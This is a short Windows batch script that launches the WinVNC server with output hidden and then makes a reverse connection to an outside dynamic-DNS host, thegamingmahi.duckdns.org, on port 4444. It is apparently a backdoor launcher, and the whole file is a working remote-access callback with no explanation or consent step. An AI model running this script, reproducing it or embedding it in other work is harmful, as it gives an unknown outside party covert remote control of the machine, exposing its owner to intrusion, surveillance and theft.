@echo off
start winvnc.exe -run
timeout /t 1>nul
start winvnc.exe -connect thegamingmahi.duckdns.org::4444